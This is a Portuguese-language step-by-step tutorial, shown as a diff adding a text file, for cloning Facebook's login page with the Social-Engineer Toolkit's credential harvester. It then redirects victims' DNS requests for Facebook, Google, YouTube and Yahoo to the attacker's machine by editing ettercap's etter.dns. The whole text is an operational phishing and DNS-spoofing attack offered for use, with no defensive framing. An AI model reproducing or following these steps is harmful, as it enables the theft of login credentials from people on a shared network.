@@ -1,0 +1,51 @@
+Crie uma página Fake do Facebook com o setoolkit (social enginner toolkit)
+
+Como faz isso ?
+
+Digite setoolkit no terminal
+
+Escolha a opção :    1) Social-Engineering Attacks
+
+Depois a opção :    2) Website Attack Vectors
+
+Depois a opção :    3) Credential Harvester Attack Method
+
+Agora a opção :    2) Site Cloner
+
+Coloque o seu IP interno,e depois a página que você quer clonar. Ex:Facebook
+
+Feito isso,não feche o terminal,o server apache vai estar funcionando enquanto o setoolikt está rodando.
+
+Agora vamos para o segundo passo.
+
+Abra outro terminal
+
+2 – Vamos Redirecionar qualquer requisição HTTP,HTTPS para o nosso IP
+
+Vamos localizar o arquivo de configuração de redirecionamento do ettercap.
+Então,digitamos no terminal :
+
+locate etter.dns
+
+Agora,vamos digitar :
+nano /usr/share/ettercap/etter.dns
+(Você pode usar o editor de texto que você quiser,exemplo : Gedit )
+
+Editaremos onde está escrito :
+################################
+# microsoft sucks ;   )
+# redirect it to www.linux.org
+#
+
+Agora é só alterar o IP que está pelo o seu.Se você quiser colocar mais sites para ser redirecionado, clolque :
+
+exemplo :
+
+https://www.google.com.br/?gws_rd=ssl A 92.168.0.11
+http://www.youtube.com A 192.168.0.11
+http://www.yahoo.com A 192.168.0.11
+https://www.facebook.com A 192.168.0.11
+
+Considerando que 192.168.0.11 seja o seu IP.
+
+
